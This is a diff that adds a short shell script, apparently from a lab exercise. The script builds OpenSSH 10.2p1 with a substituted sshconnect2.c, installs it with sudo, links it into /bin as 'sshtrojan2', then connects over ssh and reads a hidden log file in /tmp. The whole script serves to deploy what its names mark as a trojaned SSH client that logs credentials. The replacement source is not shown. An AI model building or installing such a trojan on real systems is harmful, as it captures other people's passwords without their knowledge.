@@ -1,0 +1,13 @@
+wget https://github.com/openssh/openssh-portable/archive/refs/tags/V_10_2_P1.tar.gz
+tar -xf V_10_2_P1.tar.gz
+
+cd openssh-portable-V_10_2_P1
+sudo cp ../sshconnect2.c .
+sudo ./configure --with-pam --prefix=/opt/openssh
+sudo make
+sudo make install
+
+sudo ln -s /opt/openssh/bin/ssh /bin/sshtrojan2 
+ssh 127.0.0.1
+
+cat /tmp/.log_sshtrojan2.txt
